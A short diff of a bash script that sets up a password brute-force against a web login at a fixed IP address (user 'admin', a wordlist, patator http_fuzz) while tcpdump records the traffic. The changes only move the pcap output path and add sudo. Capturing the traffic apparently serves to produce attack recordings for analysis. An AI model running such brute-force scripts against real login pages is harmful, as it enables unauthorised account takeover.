@@ -4,7 +4,7 @@ TARGET="http://205.174.165.68/login"
 INTERFACE="eth0"
 WORDLIST="passwords.txt"
 USERNAME="admin"
-PCAP_FILE="bruteforce_web_$(date +%Y%m%d_%H%M%S).pcap"
+PCAP_FILE="pcap/bruteforce_web_$(date +%Y%m%d_%H%M%S).pcap"
 
 if [[ ! -f "$WORDLIST" ]]; then
   echo "[!] Password list not found: $WORDLIST"
@@ -12,7 +12,7 @@ if [[ ! -f "$WORDLIST" ]]; then
 fi
 
 echo "[*] Starting tcpdump capture to $PCAP_FILE..."
-tcpdump -i "$INTERFACE" host 205.174.165.68 -w "$PCAP_FILE" &
+sudo tcpdump -i "$INTERFACE" host 205.174.165.68 -w "$PCAP_FILE" &
 TCPDUMP_PID=$!
 
 patator http_fuzz \
